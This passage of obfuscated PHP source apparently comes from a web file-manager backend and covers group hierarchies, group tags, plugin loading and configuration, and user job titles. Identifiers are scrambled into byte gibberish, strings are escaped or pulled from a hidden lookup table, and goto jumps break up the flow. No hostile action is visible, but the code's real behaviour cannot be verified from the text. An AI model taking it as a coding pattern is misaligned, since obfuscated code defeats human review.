$úπ˘é˜µ[$œì¸≠Ÿá] . $ª±ª©Æ∂[8]; } if ($ßÄÙó–ï) { $¸†∞•¨ﬂ .= $ﬁÜ±ˆà∫[$ª±ª©Æ∂[32]]; } $ﬁÜ±ˆà∫[$ª±ª©Æ∂[526]] = str_replace($ª±ª©Æ∂[529], $ª±ª©Æ∂[8], $¸†∞•¨ﬂ); } unset($ﬁÜ±ˆà∫); } private function _listAppendSourceRoot(&$ó€Æû¢ı, $ï‰‘µŒÊ) { $≥Õ¡ñ´≠ =& $_SERVER[Çâä∆◊¡]; $ßûë˝ôˆ = Model($≥Õ¡ñ´≠[818])->listSourceRoot(SourceModel::TYPE_GROUP, $ï‰‘µŒÊ); $ßûë˝ôˆ = array_to_keyvalue($ßûë˝ôˆ, $≥Õ¡ñ´≠[504]); $ßûë˝ôˆ = array_remove_key($ßûë˝ôˆ, $≥Õ¡ñ´≠[504]); foreach ($ó€Æû¢ı as &$óîÒ•´») { $óîÒ•´»[$≥Õ¡ñ´≠[87]] = $ßûë˝ôˆ[$óîÒ•´»[$≥Õ¡ñ´≠[1810]]] ? $ßûë˝ôˆ[$óîÒ•´»[$≥Õ¡ñ´≠[1810]]] : array(); } unset($óîÒ•´»); } protected function groupMerge($÷˘¡ŒÈâ) { $÷˘¡ŒÈâ = array_values(array_unique($÷˘¡ŒÈâ)); $¶ÌæÑ‹„ = array(); for ($ÿÅôÛÓû = 0; $ÿÅôÛÓû < count($÷˘¡ŒÈâ); $ÿÅôÛÓû++) { $ÁÅöﬂ¢ë = !1; for ($©Úˆ—‚¬ = 0; $©Úˆ—‚¬ < count($÷˘¡ŒÈâ); $©Úˆ—‚¬++) { if ($ÿÅôÛÓû == $©Úˆ—‚¬) { continue; } if ($this->isParentOf($÷˘¡ŒÈâ[$©Úˆ—‚¬], $÷˘¡ŒÈâ[$ÿÅôÛÓû])) { $ÁÅöﬂ¢ë = !0; break; } } if (!$ÁÅöﬂ¢ë) { $¶ÌæÑ‹„[] = $÷˘¡ŒÈâ[$ÿÅôÛÓû]; } } return $¶ÌæÑ‹„; } protected function isParentOf($Åå˝õüé, $•¯ú˜¡ò) { $¥ÜòÑÂ∞ =& $_SERVER[Çâä∆◊¡]; if (!$Åå˝õüé || !$•¯ú˜¡ò || $Åå˝õüé == $•¯ú˜¡ò) { return !1; } $Êæ«”Ëÿ = $this->getInfoSimple($Åå˝õüé); $ßÅ–ö”Ó = $this->getInfoSimple($•¯ú˜¡ò); $‘Î¬õœ£ = $Êæ«”Ëÿ[$¥ÜòÑÂ∞[521]] . $Åå˝õüé . $¥ÜòÑÂ∞[50]; if (substr($ßÅ–ö”Ó[$¥ÜòÑÂ∞[521]], 0, strlen($‘Î¬õœ£)) == $‘Î¬õœ£) { return !0; } return !1; } public function groupShowRoot($‹Àä›Æ∆, $’…ï∫π‰ = false) { $Ô˚ñïºÖ =& $_SERVER[Çâä∆◊¡]; $ÀÉ¢õõ∏ = $this->getInfo($‹Àä›Æ∆); if (!$ÀÉ¢õõ∏) { return array(); } $√øÎÀ∂˘ = $this->parentLevelArray($ÀÉ¢õõ∏[$Ô˚ñïºÖ[521]]); $ë•◊Ôæÿ = array($‹Àä›Æ∆); if (count($√øÎÀ∂˘) == 0) { return $ë•◊Ôæÿ; } if ($’…ï∫π‰ && count($√øÎÀ∂˘) == 1) { return $ë•◊Ôæÿ; } if (!$ÀÉ¢õõ∏[$Ô˚ñïºÖ[465]] || !isset($ÀÉ¢õõ∏[$Ô˚ñïºÖ[465]][$Ô˚ñïºÖ[1895]]) || $ÀÉ¢õõ∏[$Ô˚ñïºÖ[465]][$Ô˚ñïºÖ[1895]] == $Ô˚ñïºÖ[1864]) { return $this->groupShowRoot($√øÎÀ∂˘[count($√øÎÀ∂˘) - 1], $’…ï∫π‰); } if ($ÀÉ¢õõ∏[$Ô˚ñïºÖ[465]][$Ô˚ñïºÖ[1895]] == $Ô˚ñïºÖ[352]) { $ç›◊ßù© = explode($Ô˚ñïºÖ[50], $ÀÉ¢õõ∏[$Ô˚ñïºÖ[465]][$Ô˚ñïºÖ[1896]]); if ($ç›◊ßù©) { $ë•◊Ôæÿ = array_merge($ë•◊Ôæÿ, $ç›◊ßù©); } } return $ë•◊Ôæÿ; } protected function resetParentLevel() { $√Æ˝â˙™ =& $_SERVER[Çâä∆◊¡]; $ â‰æá = $√Æ˝â˙™[1810]; $ÿ¥£Œ˙· = $this->select(); $ÿ¥£Œ˙· = array_to_keyvalue($ÿ¥£Œ˙·, $ â‰æá); foreach ($ÿ¥£Œ˙· as $öÊ“ì”ó) { $‰∆¿·≥Í = $öÊ“ì”ó; $ÔÁµÂ…˝ = array(); while ($‰∆¿·≥Í[$√Æ˝â˙™[498]] != 0) { $ÔÁµÂ…˝[] = $‰∆¿·≥Í[$√Æ˝â˙™[498]]; $‰∆¿·≥Í = $ÿ¥£Œ˙·[$‰∆¿·≥Í[$√Æ˝â˙™[498]]]; } $ÔÁµÂ…˝[] = 0; $ÔÁµÂ…˝ = $√Æ˝â˙™[50] . implode($√Æ˝â˙™[50], array_reverse($ÔÁµÂ…˝)) . $√Æ˝â˙™[50]; $this->setNamePinyin($öÊ“ì”ó[$ â‰æá], $öÊ“ì”ó[$√Æ˝â˙™[32]]); $this->where(array($ â‰æá => $öÊ“ì”ó[$ â‰æá]))->save(array($√Æ˝â˙™[584] => $ÔÁµÂ…˝)); } return $ÿ¥£Œ˙·; } public function groupNameAuto($¬âÎ‡îƒ, $™Ä˝¨™») { $Æì◊€≤∂ =& $_SERVER[Çâä∆◊¡]; $ƒ˘¶óËñ = $this->where(array($Æì◊€≤∂[402] => $¬âÎ‡îƒ))->getField($Æì◊€≤∂[32], !0); if (!$ƒ˘¶óËñ || !in_array($™Ä˝¨™», $ƒ˘¶óËñ)) { return $™Ä˝¨™»; } for ($ê÷¨∏úù = 1; $ê÷¨∏úù <= count($ƒ˘¶óËñ) + 1; $ê÷¨∏úù++) { $ËÒÚΩê˚ = $™Ä˝¨™» . "\x28{$ê÷¨∏úù}\x29"; if (!in_array($ËÒÚΩê˚, $ƒ˘¶óËñ)) { return $ËÒÚΩê˚; } } } public function groupSwitch($≥–Ïÿ◊π, $õÛ∏ßÄç) { $ªÑﬁ©«é =& $_SERVER[Çâä∆◊¡]; $ûªÜîŒØ = array($ªÑﬁ©«é[1810] => array($ªÑﬁ©«é[7], array($≥–Ïÿ◊π, $õÛ∏ßÄç))); $∫ÿâñÂï = $this->where($ûªÜîŒØ)->select(); $∫ÿâñÂï = array_to_keyvalue($∫ÿâñÂï, $ªÑﬁ©«é[1810]); if (!isset($∫ÿâñÂï[$≥–Ïÿ◊π]) || !isset($∫ÿâñÂï[$õÛ∏ßÄç]) || $∫ÿâñÂï[$≥–Ïÿ◊π][$ªÑﬁ©«é[498]] == 0) { return !1; } $ûªÜîŒØ = array($ªÑﬁ©«é[1810] => $≥–Ïÿ◊π); $—áù≈Éä = Model($ªÑﬁ©«é[1899])->where($ûªÜîŒØ)->select(); if (!$—áù≈Éä) { $—áù≈Éä = array(); } foreach ($—áù≈Éä as $É¿’œß°) { $¶Ê⁄™⁄ó = $É¿’œß°[$ªÑﬁ©«é[1642]]; $ûªÜîŒØ = array($ªÑﬁ©«é[1642] => $¶Ê⁄™⁄ó, $ªÑﬁ©«é[1810] => $õÛ∏ßÄç); $›∏÷®€í = Model($ªÑﬁ©«é[1899])->where($ûªÜîŒØ)->find(); if (!$›∏÷®€í) { $ü˝Ÿ¯Ô… = array($õÛ∏ßÄç => $É¿’œß°[$ªÑﬁ©«é[1911]]); Model($ªÑﬁ©«é[538])->userGroupAdd($¶Ê⁄™⁄ó, $ü˝Ÿ¯Ô…); } Model($ªÑﬁ©«é[538])->userGroupRemove($¶Ê⁄™⁄ó, $≥–Ïÿ◊π); } $ûªÜîŒØ = array($ªÑﬁ©«é[412] => 2, $ªÑﬁ©«é[498] => 0, $ªÑﬁ©«é[411] => 1, $ªÑﬁ©«é[504] => array($ªÑﬁ©«é[7], array($≥–Ïÿ◊π, $õÛ∏ßÄç))); $ïòÎ•ïõ = Model($ªÑﬁ©«é[818])->where($ûªÜîŒØ)->field($ªÑﬁ©«é[1912])->select(); $ïòÎ•ïõ = array_to_keyvalue($ïòÎ•ïõ, $ªÑﬁ©«é[504], $ªÑﬁ©«é[403]); $ñôûû ” = !empty($ïòÎ•ïõ[$≥–Ïÿ◊π]) ? $ïòÎ•ïõ[$≥–Ïÿ◊π] : !1; if ($ñôûû ”) { if (!$ïòÎ•ïõ[$õÛ∏ßÄç]) { $ïòÎ•ïõ[$õÛ∏ßÄç] = Model($ªÑﬁ©«é[818])->groupRootAdd($õÛ∏ßÄç); } $≈πﬁ’©¬ = $ïòÎ•ïõ[$õÛ∏ßÄç]; $ûªÜîŒØ = array($ªÑﬁ©«é[498] => $ñôûû ”); $ïòÎ•ïõ = Model($ªÑﬁ©«é[818])->where($ûªÜîŒØ)->field($ªÑﬁ©«é[1913])->select(); if (!$ïòÎ•ïõ) { $ïòÎ•ïõ = array(); } Model($ªÑﬁ©«é[818])->moveClearAuth = !1; foreach ($ïòÎ•ïõ as $¯¬ﬂÇÃò) { $ºß⁄ÊÁ† = $¯¬ﬂÇÃò[$ªÑﬁ©«é[411]] == $ªÑﬁ©«é[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ªÑﬁ©«é[818])->move($¯¬ﬂÇÃò[$ªÑﬁ©«é[403]], $≈πﬁ’©¬, $ºß⁄ÊÁ†); } Model($ªÑﬁ©«é[818])->moveClearAuth = !0; $ûªÜîŒØ = array($ªÑﬁ©«é[412] => 2, $ªÑﬁ©«é[504] => $≥–Ïÿ◊π); $ﬁ÷›ﬁ±√ = array($ªÑﬁ©«é[504] => $õÛ∏ßÄç); Model($ªÑﬁ©«é[1914])->where($ûªÜîŒØ)->save($ﬁ÷›ﬁ±√); Model($ªÑﬁ©«é[1915])->where($ûªÜîŒØ)->save($ﬁ÷›ﬁ±√); } $this->_changeChildLevel($∫ÿâñÂï[$≥–Ïÿ◊π], $∫ÿâñÂï[$õÛ∏ßÄç], !0); $this->where(array($ªÑﬁ©«é[498] => $≥–Ïÿ◊π))->save(array($ªÑﬁ©«é[498] => $õÛ∏ßÄç)); $this->_clearChildrenCache($∫ÿâñÂï[$õÛ∏ßÄç]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($·Ä »íÇ) { $Ì∂Ω…ÁŒ =& $_SERVER[Çâä∆◊¡]; return array($Ì∂Ω…ÁŒ[1916] => array($·Ä »íÇ[0], $Ì∂Ω…ÁŒ[1917]), $Ì∂Ω…ÁŒ[1918] => array($·Ä »íÇ[0], $Ì∂Ω…ÁŒ[1919])); } protected function get($ÙÚ˚ºò˛) { $ÂÔ«òµò =& $_SERVER[Çâä∆◊¡]; $È£Ø∆Ó¡ = Model($ÂÔ«òµò[522])->metaGet($ÙÚ˚ºò˛, $ÂÔ«òµò[1920]); $ˆé‘∑Â˛ = json_decode($È£Ø∆Ó¡, !0); return $ˆé‘∑Â˛ ? $ˆé‘∑Â˛ : array($ÂÔ«òµò[1921] => $ÂÔ«òµò[89], $ÂÔ«òµò[364] => array()); } protected function set($–Ä˛π±ä, $Ì°˘ù≤Ã) { $Éı™œÿ˛ =& $_SERVER[Çâä∆◊¡]; $Ì°˘ù≤Ã = $Ì°˘ù≤Ã ? $Ì°˘ù≤Ã : array($Éı™œÿ˛[1921] => $Éı™œÿ˛[89], $Éı™œÿ˛[364] => array()); Model($Éı™œÿ˛[522])->metaSet($–Ä˛π±ä, $Éı™œÿ˛[1920], json_encode($Ì°˘ù≤Ã)); return Model($Éı™œÿ˛[522])->metaSet($–Ä˛π±ä, $Éı™œÿ˛[1920], json_encode($Ì°˘ù≤Ã)); } protected function getByTagID($¿–àëÖ◊, $”Ü£ª‚Â) { $˜Ôæ⁄ú— =& $_SERVER[Çâä∆◊¡]; if (!$¿–àëÖ◊ || !$”Ü£ª‚Â) { return !1; } if (!Model($˜Ôæ⁄ú—[522])->getInfoSimple($¿–àëÖ◊)) { return !1; } $±Õ•–Ëµ = $this->get($¿–àëÖ◊); if (!$±Õ•–Ëµ || !isset($±Õ•–Ëµ[$˜Ôæ⁄ú—[364]])) { return !1; } $ ±üò»ı = array_find_by_field($±Õ•–Ëµ[$˜Ôæ⁄ú—[364]], $˜Ôæ⁄ú—[401], $”Ü£ª‚Â); return is_array($ ±üò»ı) ? $ ±üò»ı : !1; } public function listSource($Ì⁄∫Œ‘æ, $ôíÓ¿Í£) { $ˆßÎ…ñ⁄ =& $_SERVER[Çâä∆◊¡]; if ($ôíÓ¿Í£ && !is_array($ôíÓ¿Í£)) { $ôíÓ¿Í£ = array($ôíÓ¿Í£); } $§èÙ™˜ = $this->listData($Ì⁄∫Œ‘æ); $–îÏ¢˛± = array(); foreach ($§èÙ™˜ as $ŒŸÇ≥∞«) { $áÜª´„˙ = $ŒŸÇ≥∞«[$ˆßÎ…ñ⁄[78]]; if (!$áÜª´„˙) { continue; } if (!isset($–îÏ¢˛±[$áÜª´„˙])) { $–îÏ¢˛±[$áÜª´„˙] = array(); } $–îÏ¢˛±[$áÜª´„˙][] = $ŒŸÇ≥∞«[$ˆßÎ…ñ⁄[427]]; } $πÍ¶íÔ„ = array(); foreach ($–îÏ¢˛± as $Ïë¥É˝’ => $¥É◊¶á£) { $¿ÿ∑õÆã = !0; if (!$ôíÓ¿Í£) { $πÍ¶íÔ„[] = $Ïë¥É˝’; continue; } foreach ($ôíÓ¿Í£ as $‹¬È¸ÖÑ) { if (!in_array($‹¬È¸ÖÑ, $¥É◊¶á£)) { $¿ÿ∑õÆã = !1; break; } } if ($¿ÿ∑õÆã) { $πÍ¶íÔ„[] = $Ïë¥É˝’; } } if (!$πÍ¶íÔ„) { return array(); } $õé≈æ¸Æ = array($ˆßÎ…ñ⁄[418] => array($ˆßÎ…ñ⁄[419], $πÍ¶íÔ„), $ˆßÎ…ñ⁄[504] => $Ì⁄∫Œ‘æ, $ˆßÎ…ñ⁄[412] => SourceModel::TYPE_GROUP); $ßÔç‹⁄ª = Model($ˆßÎ…ñ⁄[1312])->listSource($õé≈æ¸Æ); if (!$ßÔç‹⁄ª || count($πÍ¶íÔ„) == $ßÔç‹⁄ª[$ˆßÎ…ñ⁄[361]][$ˆßÎ…ñ⁄[362]]) { return $ßÔç‹⁄ª; } $µùﬁÎá» = array(); $Ëã„†Œ˘ = array_to_keyvalue($ßÔç‹⁄ª[$ˆßÎ…ñ⁄[77]], $ˆßÎ…ñ⁄[12], $ˆßÎ…ñ⁄[403]); $∂ﬂπœóé = array_to_keyvalue($ßÔç‹⁄ª[$ˆßÎ…ñ⁄[76]], $ˆßÎ…ñ⁄[12], $ˆßÎ…ñ⁄[403]); $˝ÿüªâ˙ = array_merge($∂ﬂπœóé, $Ëã„†Œ˘); foreach ($πÍ¶íÔ„ as $áÜª´„˙) { if (!in_array($áÜª´„˙, $˝ÿüªâ˙)) { $µùﬁÎá»[] = $áÜª´„˙; } } if ($µùﬁÎá») { $this->removeBySource($Ì⁄∫Œ‘æ, $µùﬁÎá»); } return $ßÔç‹⁄ª; } protected function listData($ÕÀ¿∫’Ñ) { $ÅãÌ«∂Õ =& $_SERVER[Çâä∆◊¡]; $∆ˆ§Ï´˙ = array($ÅãÌ«∂Õ[1633] => 0, $ÅãÌ«∂Õ[483] => array($ÅãÌ«∂Õ[1922], 0), $ÅãÌ«∂Õ[423] => $ÅãÌ«∂Õ[1923] . $ÕÀ¿∫’Ñ); $§æ«ó ® = $ÅãÌ«∂Õ[1924]; $ﬁÁÀûﬂ™ = $this->field($§æ«ó ®)->where($∆ˆ§Ï´˙)->order($ÅãÌ«∂Õ[1925])->select(); return $ﬁÁÀûﬂ™ ? $ﬁÁÀûﬂ™ : array(); } protected function addToTag($’˚ƒ€€ó, $÷œ˜≥ﬁå, $÷»˘„Ê£) { $™«á∂ØÊ =& $_SERVER[Çâä∆◊¡]; if (!$this->getByTagID($’˚ƒ€€ó, $÷»˘„Ê£) || !$÷œ˜≥ﬁå) { return !1; } if (!Model($™«á∂ØÊ[818])->pathInfo($÷œ˜≥ﬁå)) { return !1; } $‡•‹àÚ = array($™«á∂ØÊ[1633] => 0, $™«á∂ØÊ[483] => $÷»˘„Ê£, $™«á∂ØÊ[422] => $÷œ˜≥ﬁå, $™«á∂ØÊ[423] => $™«á∂ØÊ[1926] . $’˚ƒ€€ó, $™«á∂ØÊ[421] => $™«á∂ØÊ[12], $™«á∂ØÊ[1814] => 0); if ($this->where($‡•‹àÚ)->find()) { return !1; } return $this->add($‡•‹àÚ); } protected function removeFromTag($∑É∆„¬¨, $öç…ªÕŒ, $ˆ‡´•ªÜ) { $”üèª¡™ =& $_SERVER[Çâä∆◊¡]; if (!$this->getByTagID($∑É∆„¬¨, $ˆ‡´•ªÜ) || !$öç…ªÕŒ) { return !1; } if (is_array($öç…ªÕŒ)) { $öç…ªÕŒ = array($”üèª¡™[7], $öç…ªÕŒ); } $¨ª≈ÔÂæ = array($”üèª¡™[1633] => 0, $”üèª¡™[483] => $ˆ‡´•ªÜ, $”üèª¡™[423] => $”üèª¡™[1926] . $∑É∆„¬¨, $”üèª¡™[422] => $öç…ªÕŒ); return $this->where($¨ª≈ÔÂæ)->delete(); } protected function removeByTag($¶Í¶ÿ¡Ç, $ì˛Õ≈Ô∫) { $à‡ΩÇ¡ó =& $_SERVER[Çâä∆◊¡]; if (!$this->getByTagID($¶Í¶ÿ¡Ç, $ì˛Õ≈Ô∫)) { return !1; } $ÛèÑ⁄¨ı = array($à‡ΩÇ¡ó[1633] => 0, $à‡ΩÇ¡ó[483] => $ì˛Õ≈Ô∫, $à‡ΩÇ¡ó[423] => $à‡ΩÇ¡ó[1926] . $¶Í¶ÿ¡Ç); return $this->where($ÛèÑ⁄¨ı)->delete(); } protected function removeBySource($˙ƒ∆¥üï, $Áå¸‰÷®) { $∑Üû∂¥◊ =& $_SERVER[Çâä∆◊¡]; if (!$˙ƒ∆¥üï || !$Áå¸‰÷®) { return !1; } if (is_array($Áå¸‰÷®)) { $Áå¸‰÷® = array($∑Üû∂¥◊[7], $Áå¸‰÷®); } $íï’ÈÛÖ = array($∑Üû∂¥◊[1633] => 0, $∑Üû∂¥◊[422] => $Áå¸‰÷®, $∑Üû∂¥◊[483] => array($∑Üû∂¥◊[1001], 0), $∑Üû∂¥◊[423] => $∑Üû∂¥◊[1926] . $˙ƒ∆¥üï); return $this->where($íï’ÈÛÖ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\160\154\165\147\151\156\114\151\x73\164"; public $field = array("\156\x61\x6d\145", "\163\164\x61\x74\x75\x73", "\x72\x65\x67\151\x65\163\164", "\143\157\156\146\x69\x67"); public function loadList($◊÷•£¨π = false) { $ïÄ£à˚Ò = array_to_keyvalue($this->listData(), $_SERVER[Çâä∆◊¡][32]); if ($◊÷•£¨π) { return $ïÄ£à˚Ò[$◊÷•£¨π]; } return $ïÄ£à˚Ò; } public function init() { $ü«˘€Ç‹ =& $_SERVER[Çâä∆◊¡]; Hook::trigger($ü«˘€Ç‹[1927]); $‡ÍîñÜÊ = $this->loadPluginList(); foreach ($‡ÍîñÜÊ as $√˜ØÆë› => $û«÷Ïπ) { $ø¯æÿıÜ = $this->appAllow($√˜ØÆë›, $û«÷Ïπ); if (!$ø¯æÿıÜ) { continue; } foreach ($û«÷Ïπ[$ü«˘€Ç‹[1928]] as $ÖËò—äÁ => $ÉõÃÅÎ») { Hook::bind($ÖËò—äÁ, $ÉõÃÅÎ»); } } Hook::trigger($ü«˘€Ç‹[1929]); Hook::trigger(ACTION); } public function appAllow($ìƒ¯®ß¢, $à…≈≤ØΩ, $»±¿Ü÷… = true) { $ÅòÒˆ‚‰ =& $_SERVER[Çâä∆◊¡]; $ÁËú∆ïœ = PLUGIN_DIR . $ìƒ¯®ß¢ . $ÅòÒˆ‚‰[1930]; if (!is_array($à…≈≤ØΩ) || !is_array($à…≈≤ØΩ[$ÅòÒˆ‚‰[1928]]) || $à…≈≤ØΩ[$ÅòÒˆ‚‰[743]] != 1 || !is_file($ÁËú∆ïœ)) { return !1; } if ($GLOBALS[$ÅòÒˆ‚‰[505]] == 1) { return !0; } if ($»±¿Ü÷… && !Action($ÅòÒˆ‚‰[1931])->checkAuth($ìƒ¯®ß¢)) { return !1; } return !0; } public function unInstall($æ√à°ƒ∂) { $•¸ßãÇ =& $_SERVER[Çâä∆◊¡]; $ÈÇ‡∆ëÌ = $this->loadList($æ√à°ƒ∂); if (file_exists(PLUGIN_DIR . $æ√à°ƒ∂)) { Hook::apply($æ√à°ƒ∂ . $•¸ßãÇ[1932]); } $this->remove($ÈÇ‡∆ëÌ[$•¸ßãÇ[401]]); } public function changeStatus($∫ùµ‘ä”, $ñË¯ÄÌ) { $ÂêŒ÷õ– =& $_SERVER[Çâä∆◊¡]; $«◊Ó›‰ˆ = $this->loadList($∫ùµ‘ä”); if ($ñË¯ÄÌ) { Hook::apply($∫ùµ‘ä” . $ÂêŒ÷õ–[1933]); } $this->update($«◊Ó›‰ˆ[$ÂêŒ÷õ–[401]], array($ÂêŒ÷õ–[1934] => $ñË¯ÄÌ)); } public function appRegist($¥Ô„¿¯¡, $ıØ¿øΩ•) { $ƒÚ¬¨åí =& $_SERVER[Çâä∆◊¡]; $ËÅáâò— = $this->loadList($¥Ô„¿¯¡); if ($ËÅáâò—) { $this->update($ËÅáâò—[$ƒÚ¬¨åí[401]], array($ƒÚ¬¨åí[1928] => $ıØ¿øΩ•)); } else { $Ø ∆ïé∆ = array($ƒÚ¬¨åí[32] => $¥Ô„¿¯¡, $ƒÚ¬¨åí[1928] => $ıØ¿øΩ•, $ƒÚ¬¨åí[743] => 0, $ƒÚ¬¨åí[6] => $this->getConfigDefault($¥Ô„¿¯¡)); $this->insert($Ø ∆ïé∆); } } public function getConfigDefault($Â≤õâß≤) { $ö‘∏Èí¥ =& $_SERVER[Çâä∆◊¡]; $“áµóÉö = array(); $„‘‰Ç˝‚ = $this->getPackageJson($Â≤õâß≤); if (!$„‘‰Ç˝‚ && is_array($„‘‰Ç˝‚[$ö‘∏Èí¥[1935]])) { return $“áµóÉö; } foreach ($„‘‰Ç˝‚[$ö‘∏Èí¥[1935]] as $≥€¸≤÷à => $¬•ÃòìÆ) { if (!isset($¬•ÃòìÆ[$ö‘∏Èí¥[369]]) || isset($“áµóÉö[$≥€¸≤÷à])) { continue; } $“áµóÉö[$≥€¸≤÷à] = $¬•ÃòìÆ[$ö‘∏Èí¥[369]]; } return $“áµóÉö; } public function getPackageJson($∆◊˜êÇ®) { return Hook::apply($∆◊˜êÇ® . $_SERVER[Çâä∆◊¡][1936]); } public function getConfig($ääÆÎ Ê, $àœ©≠´± = false) { $Ÿåâò£ã =& $_SERVER[Çâä∆◊¡]; $ëÒä±„¸ = array(); $Ë¥∆Æë• = $this->loadList($ääÆÎ Ê); if ($Ë¥∆Æë• && is_array($Ë¥∆Æë•[$Ÿåâò£ã[6]])) { $ëÒä±„¸ = $Ë¥∆Æë•[$Ÿåâò£ã[6]]; } if (!$ëÒä±„¸ || $àœ©≠´±) { $ëÒä±„¸ = $this->getConfigDefault($ääÆÎ Ê); } return $ëÒä±„¸; } public function setConfig($œòÑ˙ÔÎ, $Î˚†çÖ‚ = false) { $¸ª±Âê© =& $_SERVER[Çâä∆◊¡]; $ú∑›ˆøí = $this->loadList($œòÑ˙ÔÎ); if (!$ú∑›ˆøí) { return !1; } $∫´ßÇì¥ = $ú∑›ˆøí[$¸ª±Âê©[6]]; if ($Î˚†çÖ‚ == !1) { $∫´ßÇì¥ = array(); $Î˚†çÖ‚ = $this->getConfigDefault($œòÑ˙ÔÎ); } foreach ($Î˚†çÖ‚ as $≠˘Á¡ˆ• => $˛Éô¢ÀÅ) { $∫´ßÇì¥[$≠˘Á¡ˆ•] = is_string($˛Éô¢ÀÅ) ? trim($˛Éô¢ÀÅ) : $˛Éô¢ÀÅ; } $this->update($ú∑›ˆøí[$¸ª±Âê©[401]], array($¸ª±Âê©[6] => $∫´ßÇì¥)); } public function viewList() { $Ú√©Â˙ÿ =& $_SERVER[Çâä∆◊¡]; $Òà“¸≠◊ = $this->loadList(); $this->pluginScan($Òà“¸≠◊); $Òà“¸≠◊ = $this->loadPluginList(); $íú÷…›Ô = array(); foreach ($Òà“¸≠◊ as $Ôﬁœ≠€æ => $∂€∞˛•Á) { unset($∂€∞˛•Á[$Ú√©Â˙ÿ[1928]], $∂€∞˛•Á[$Ú√©Â˙ÿ[6]]); $É†¡û∂Ø = PLUGIN_DIR . $∂€∞˛•Á[$Ú√©Â˙ÿ[32]] . $Ú√©Â˙ÿ[1930]; if (!is_file($É†¡û∂Ø)) { continue; } $ßÍº˜«› = Hook::apply($∂€∞˛•Á[$Ú√©Â˙ÿ[32]] . $Ú√©Â˙ÿ[1936]); if (is_array($ßÍº˜«›)) { $íú÷…›Ô[$Ôﬁœ≠€æ] = array_merge($∂€∞˛•Á, $ßÍº˜«›); } } return $íú÷…›Ô; } private function loadPluginList() { $áá˝‰ç« =& $_SERVER[Çâä∆◊¡]; $˚¨™˜µπ = $this->loadList(); if (strtolower(MOD) == $áá˝‰ç«[1937]) { return $˚¨™˜µπ; } $˙˝Ô«ØÂ = Hook::trigger($áá˝‰ç«[1938], $˚¨™˜µπ); if ($˚¨™˜µπ && !$˙˝Ô«ØÂ) { die; } return $˙˝Ô«ØÂ ? $˙˝Ô«ØÂ : $˚¨™˜µπ; } private function pluginScan($±›Òè÷ö) { $Ø£Ç‹ùÄ =& $_SERVER[Çâä∆◊¡]; recursion_dir(PLUGIN_DIR, $ÒÎÂÛ¶¿, $´€≈åÚØ, 0); foreach ($ÒÎÂÛ¶¿ as $˘ïò≠íœ) { $‘¶»ú∫Æ = get_path_this($˘ïò≠íœ); if (isset($±›Òè÷ö[$‘¶»ú∫Æ]) || !file_exists($˘ïò≠íœ . $Ø£Ç‹ùÄ[1939]) || !file_exists($˘ïò≠íœ . $Ø£Ç‹ùÄ[1930])) { continue; } Hook::apply($‘¶»ú∫Æ . $Ø£Ç‹ùÄ[1933]); } } } goto bª¿ﬂâÜ√ç; F ¢æØ∑ïè: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\x6a\x6f\x62\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\144\145\x73\143", "\163\157\x72\164"); const JOB_KEY = "\x73\145\154\146\x4a\157\142\x4c\151\x73\164"; public function listData($äÅà‚Ú¿ = false, $ôÅß∑ë¶ = "\x73\x6f\162\x74", $ß˜ıû‰„ = false) { return parent::listData($äÅà‚Ú¿, $ôÅß∑ë¶, $ß˜ıû‰„); } public function remove($¡Êœùèú) { return parent::remove($¡Êœùèú); } public function add($î∞å≈‘¬) { $∆Ößå¸Ä =& $_SERVER[Çâä∆◊¡]; if ($this->findByName($î∞å≈‘¬[$∆Ößå¸Ä[32]])) { return !1; } $î∞å≈‘¬[$∆Ößå¸Ä[1833]] = $this->getSort(); return parent::insert($î∞å≈‘¬); } private function getSort() { $¯°÷ó÷≠ =& $_SERVER[Çâä∆◊¡]; $ôœ≥Œ÷Ò = parent::listData(); $‡÷ê±öﬂ = array_to_keyvalue($ôœ≥Œ÷Ò, $¯°÷ó÷≠[12], $¯°÷ó÷≠[1833]); return empty($‡÷ê±öﬂ) ? 0 : max($‡÷ê±öﬂ) + 1; } public function update($ÀŒÕ≠¢®, $”ìñÁ∫Ì) { $©Ó˘Ω¡Æ =& $_SERVER[Çâä∆◊¡]; $±‘÷ŸÀ⁄ = parent::listData($ÀŒÕ≠¢®); $‹©Çº°“ = $this->findByName($”ìñÁ∫Ì[$©Ó˘Ω¡Æ[32]]); if (!$±‘÷ŸÀ⁄ || $‹©Çº°“ && $‹©Çº°“[$©Ó˘Ω¡Æ[401]] != $±‘÷ŸÀ⁄[$©Ó˘Ω¡Æ[401]]) { return !1; } return parent::update($ÀŒÕ≠¢®, $”ìñÁ∫Ì); } public function setUserJob($õ¢Áº’˚, $⁄õ∏πøÚ) { $™ö…Öµ˛ =& $_SERVER[Çâä∆◊¡]; if (!is_array($⁄õ∏πøÚ)) { $⁄õ∏πøÚ = array($⁄õ∏πøÚ); } $¯èÍÃŒ˝ = parent::listData(); $î€Ÿó’ƒ = array_to_keyvalue($¯èÍÃŒ˝, $™ö…Öµ˛[32]); $◊∫éπ∂÷ = $™ö…Öµ˛[373]; foreach ($⁄õ∏πøÚ as $Ô∏—“Ù•) { if ($î€Ÿó’ƒ[$Ô∏—“Ù•]) { $◊∫éπ∂÷ .= $î€Ÿó’ƒ[$Ô∏—“Ù•][$™ö…Öµ˛[401]] . $™ö…Öµ˛[50]; } else { $¸˝Ìﬁ√  = $this->add($Ô∏—“Ù•); $◊∫éπ∂÷ .= $¸˝Ìﬁ√  . $™ö…Öµ˛[50]; } } $◊∫éπ∂÷ = rtrim($◊∫éπ∂÷, $™ö…Öµ˛[50]); Model($™ö…Öµ˛[538])->metaSet($õ¢Áº’˚, self::JOB_KEY, $◊∫éπ∂÷); } public function getUserJob($„Ò†ˆ˙Ñ) { $∆…ó»¬Ù = Model($_SERVER[Çâä∆◊¡][538])->metaGet($„Ò†ˆ˙Ñ); return $this->getUserJobInfo($∆…ó»¬Ù[self::JOB_KEY]); } public function getUserJobInfo($¥Ÿ§ª¡≠) { $ô∂õ§Õâ =& $_SERVER[Çâä∆◊¡]; $àò£Óáº = explode($ô∂õ§Õâ[50], $¥Ÿ§ª¡≠); $¿°ùîÿù = parent::listData(); $¿°ùîÿù = 